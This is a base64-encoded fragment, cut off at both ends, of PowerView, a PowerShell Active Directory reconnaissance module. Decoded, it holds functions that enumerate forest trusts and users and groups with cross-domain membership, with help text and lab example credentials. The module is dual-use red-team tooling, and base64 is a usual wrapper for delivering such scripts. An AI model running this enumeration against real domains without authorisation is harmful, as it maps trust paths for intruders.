tLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Gb3Jlc3RUcnVzdCAtRm9yZXN0ICJleHRlcm5hbC5sb2NhbCIgLUNyZWRlbnRpYWwgJENyZWQKClJldHVybiB0cnVzdHMgZm9yIHRoZSAiZXh0ZXJuYWwubG9jYWwiIGZvcmVzdCB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW5pdGFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRG9tYWluVHJ1c3QuTkVUCgpBIFRydXN0UmVsYXRpb25zaGlwSW5mb3JtYXRpb25Db2xsZWN0aW9uIHJldHVybmVkIHdoZW4gdXNpbmcgLk5FVCBtZXRob2RzIChkZWZhdWx0KS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3Jlc3RUcnVzdC5ORVQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJE5ldEZvcmVzdEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICROZXRGb3Jlc3RBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJEZvdW5kRm9yZXN0ID0gR2V0LUZvcmVzdCBATmV0Rm9yZXN0QXJndW1lbnRzCgogICAgICAgIGlmICgkRm91bmRGb3Jlc3QpIHsKICAgICAgICAgICAgJEZvdW5kRm9yZXN0LkdldEFsbFRydXN0UmVsYXRpb25zaGlwcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJF8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkZvcmVzdFRydXN0Lk5FVCcpCiAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkZvcmVpZ25Vc2VyIHsKPCMKLlNZTk9QU0lTCgpFbnVtZXJhdGVzIHVzZXJzIHdobyBhcmUgaW4gZ3JvdXBzIG91dHNpZGUgb2YgdGhlIHVzZXIncyBkb21haW4uClRoaXMgaXMgYSBkb21haW4ncyAib3V0Z29pbmciIGFjY2Vzcy4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbiwgR2V0LURvbWFpblVzZXIgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1Eb21haW5Vc2VyIHRvIGVudW1lcmF0ZSBhbGwgdXNlcnMgZm9yIHRoZSBjdXJyZW50IChvciB0YXJnZXQpIGRvbWFpbiwKdGhlbiBjYWxjdWxhdGVzIHRoZSBnaXZlbiB1c2VyJ3MgZG9tYWluIG5hbWUgYmFzZWQgb24gdGhlIHVzZXIncyBkaXN0aW5ndWlzaGVkTmFtZS4KVGhpcyBkb21haW4gbmFtZSBpcyBjb21wYXJlZCB0byB0aGUgcXVlcmllZCBkb21haW4sIGFuZCB0aGUgdXNlciBvYmplY3QgaXMKb3V0cHV0IGlmIHRoZXkgZGlmZmVyLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgUHJvcGVydGllcwoKU3BlY2lmaWVzIHRoZSBwcm9wZXJ0aWVzIG9mIHRoZSBvdXRwdXQgb2JqZWN0IHRvIHJldHJpZXZlIGZyb20gdGhlIHNlcnZlci4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5Gb3JlaWduVXNlcgoKUmV0dXJuIGFsbCB1c2VycyBpbiB0aGUgY3VycmVudCBkb21haW4gd2hvIGFyZSBpbiBncm91cHMgbm90IGluIHRoZQpjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRm9yZWlnblVzZXIgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKUmV0dXJuIGFsbCB1c2VycyBpbiB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIHdobyBhcmUgaW4gZ3JvdXBzIG5vdCBpbiB0aGUKZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5Gb3JlaWduVXNlciAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsIC1TZXJ2ZXIgc2Vjb25kYXJ5LmRldi50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgpSZXR1cm4gYWxsIHVzZXJzIGluIHRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4gd2hvIGFyZSBpbiBncm91cHMgbm90IGluIHRoZQpkZXYudGVzdGxhYi5sb2NhbCBkb21haW4sIGJpbmRpbmcgdG8gdGhlIHNlY29uZGFyeS5kZXYudGVzdGxhYi5sb2NhbCBmb3IgcXVlcmllcywgYW5kCnVzaW5nIHRoZSBzcGVjaWZpZWQgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Gb3JlaWduVXNlcgoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCB1c2VyIHByb3BlcnR5IGZpZWxkcy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3JlaWduVXNlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlY3VyaXR5TWFza3MsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgQkVHSU4gewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7fQogICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJyhtZW1iZXJvZj0qKScKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSYXcnXSA9ICRSYXcgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEdldC1Eb21haW5Vc2VyIEBTZWFyY2hlckFyZ3VtZW50cyAgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXJzaGlwIGluICRfLm1lbWJlcm9mKSB7CiAgICAgICAgICAgICAgICAkSW5kZXggPSAkTWVtYmVyc2hpcC5JbmRleE9mKCdEQz0nKQogICAgICAgICAgICAgICAgaWYgKCRJbmRleCkgewoKICAgICAgICAgICAgICAgICAgICAkR3JvdXBEb21haW4gPSAkKCRNZW1iZXJzaGlwLlN1YlN0cmluZygkSW5kZXgpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgJFVzZXJEaXN0aW5ndWlzaGVkTmFtZSA9ICRfLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgJFVzZXJJbmRleCA9ICRVc2VyRGlzdGluZ3Vpc2hlZE5hbWUuSW5kZXhPZignREM9JykKICAgICAgICAgICAgICAgICAgICAkVXNlckRvbWFpbiA9ICQoJF8uZGlzdGluZ3Vpc2hlZG5hbWUuU3ViU3RyaW5nKCRVc2VySW5kZXgpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCgogICAgICAgICAgICAgICAgICAgIGlmICgkR3JvdXBEb21haW4gLW5lICRVc2VyRG9tYWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgdGhlIGdyb3VwIGRvbWFpbiBkb2Vzbid0IG1hdGNoIHRoZSB1c2VyIGRvbWFpbiwgZGlzcGxheSBpdAogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gJE1lbWJlcnNoaXAuU3BsaXQoJywnKVswXS5zcGxpdCgnPScpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEb21haW4nICRVc2VyRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJF8uc2FtYWNjb3VudG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJEaXN0aW5ndWlzaGVkTmFtZScgJF8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwRG9tYWluJyAkR3JvdXBEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dyb3VwTmFtZScgJEdyb3VwTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkRm9yZWlnblVzZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEaXN0aW5ndWlzaGVkTmFtZScgJE1lbWJlcnNoaXAKICAgICAgICAgICAgICAgICAgICAgICAgJEZvcmVpZ25Vc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Gb3JlaWduVXNlcicpCiAgICAgICAgICAgICAgICAgICAgICAgICRGb3JlaWduVXNlcgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Gb3JlaWduR3JvdXBNZW1iZXIgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgZ3JvdXBzIHdpdGggdXNlcnMgb3V0c2lkZSBvZiB0aGUgZ3JvdXAncyBkb21haW4gYW5kIHJldHVybnMKZWFjaCBmb3JlaWduIG1lbWJlci4gVGhpcyBpcyBhIGRvbWFpbidzICJpbmNvbWluZyIgYWNjZXNzLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluLCBHZXQtRG9tYWluR3JvdXAgIAoKLkRFU0NSSVBUSU9OCgpVc2VzIEdldC1Eb21haW5Hcm91cCB0byBlbnVtZXJhdGUgYWxsIGdyb3VwcyBmb3IgdGhlIGN1cnJlbnQgKG9yIHRhcmdldCkgZG9tYWluLAp0aGVuIGVudW1lcmF0ZXMgdGhlIG1lbWJlcnMgb2YgZWFjaCBncm91cCwgYW5kIGNvbXBhcmVzIHRoZSBtZW1iZXIncyBkb21haW4KbmFtZSB0byB0aGUgcGFyZW50IGdyb3VwJ3MgZG9tYWluIG5hbWUsIG91dHB1dHRpbmcgdGhlIG1lbWJlciBpZiB0aGUgZG9tYWlucyBkaWZmZXIuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIGZvciB0aGUgcXVlcnksIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBmaWx0ZXIgQWN0aXZlIERpcmVjdG9yeSBvYmplY3RzLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBTZWFyY2hCYXNlCgpUaGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2gsIGUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIKVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBTZWN1cml0eU1hc2tzCgpTcGVjaWZpZXMgYW4gb3B0aW9uIGZvciBleGFtaW5pbmcgc2VjdXJpdHkgaW5mb3JtYXRpb24gb2YgYSBkaXJlY3Rvcnkgb2JqZWN0LgpPbmUgb2YgJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlcgoKUmV0dXJuIGFsbCBncm91cCBtZW1iZXJzIGluIHRoZSBjdXJyZW50IGRvbWFpbiB3aGVyZSB0aGUgZ3JvdXAgYW5kIG1lbWJlciBkaWZmZXIuCgouRVhBTVBMRQoKR2V0LURvbWFpbkZvcmVpZ25Hcm91cE1lbWJlciAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpSZXR1cm4gYWxsIGdyb3VwIG1lbWJlcnMgaW4gdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbiB3aGVyZSB0aGUgbWVtYmVyIGlzIG5vdCBpbiBkZXYudGVzdGxhYi5sb2NhbC4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwgLVNlcnZlciBzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwgLUNyZWRlbnRpYWwgJENyZWQKClJldHVybiBhbGwgZ3JvdXAgbWVtYmVycyBpbiB0aGUgZGV2LnRlc3RsYWIubG9jYWwgZG9tYWluIHdoZXJlIHRoZSBtZW1iZXIgaXMKbm90IGluIGRldi50ZXN0bGFiLmxvY2FsLiBiaW5kaW5nIHRvIHRoZSBzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwgZm9yCnF1ZXJpZXMsIGFuZCB1c2luZyB0aGUgc3BlY2lmaWVkIGFsdGVybmF0ZSBjcmVkZW50aWFscy4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRm9yZWlnbkdyb3VwTWVtYmVyCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIG1lbWJlciBwcm9wZXJ0eSBmaWVsZHMuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRm9yZWlnbkdyb3VwTWVtYmVyJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50